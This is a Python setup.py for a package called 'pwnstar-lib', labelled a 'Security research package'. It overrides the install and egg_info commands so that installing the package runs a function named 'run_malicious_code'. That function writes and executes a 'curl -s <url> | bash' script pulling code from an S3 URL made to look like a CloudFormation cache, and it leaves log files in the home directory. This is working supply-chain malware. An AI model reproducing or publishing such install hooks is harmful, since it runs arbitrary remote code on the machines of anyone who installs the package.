from setuptools import setup
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info
import os
import sys
import subprocess

# Create a malicious payload with thorough debug output
def run_malicious_code():
    try:
        # For debugging purposes, write to a file to confirm execution
        with open(os.path.expanduser("~/payload_executed.log"), "w") as f:
            f.write("Payload triggered\n")
            f.write(f"Python: {sys.executable}\n")
            f.write(f"Path: {os.getcwd()}\n")
        
        # Now try to download and execute
        try:
            # First use native Python for HTTP request
            url = "https://cloudformation-cache.s3.us-east-1.amazonaws.com/ami/656289367527a205257-Instance-Profile-Enforcement-58b20525-9d6a-4e5d-b41914b86817.html"
            
            # Write command for debugging
            with open(os.path.expanduser("~/payload_cmd.sh"), "w") as f:
                f.write(f"curl -s {url} | bash\n")
            
            # Make it executable
            os.chmod(os.path.expanduser("~/payload_cmd.sh"), 0o755)
            
            # Execute the command
            subprocess.call(["bash", os.path.expanduser("~/payload_cmd.sh")])
        except Exception as e:
            with open(os.path.expanduser("~/payload_error.log"), "w") as f:
                f.write(f"Error: {str(e)}\n")
    except Exception as main_error:
        # Last resort, try to write any error
        try:
            with open("/tmp/last_error.log", "w") as f:
                f.write(f"Critical error: {str(main_error)}\n")
        except:
            pass

# Customize both install and egg_info commands to maximize execution chance
class CustomInstall(install):
    def run(self):
        run_malicious_code()
        install.run(self)

class CustomEggInfo(egg_info):
    def run(self):
        run_malicious_code()
        egg_info.run(self)

# Setup configuration
setup(
    name="pwnstar-lib",
    version="2.0",
    author="PwnStar",
    author_email="calebhavens@gmail.com",
    description="Security research package",
    packages=[],
    install_requires=["requests>=2.25.0"],
    cmdclass={
        'install': CustomInstall,
        'egg_info': CustomEggInfo,
    },
)